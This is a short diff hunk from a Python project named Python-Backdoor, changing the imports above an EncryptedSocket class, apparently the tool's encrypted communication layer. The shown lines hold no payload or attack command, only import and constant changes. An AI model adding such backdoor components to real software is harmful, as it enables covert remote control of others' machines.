@@ -5,13 +5,14 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import base64
 import json
 import logging
 
 from cryptography.fernet import Fernet
 
-from src.defs import *
+from src.logger import LOGGER_ID
+
+BUFFER = 1024
 
 
 class EncryptedSocket(object):
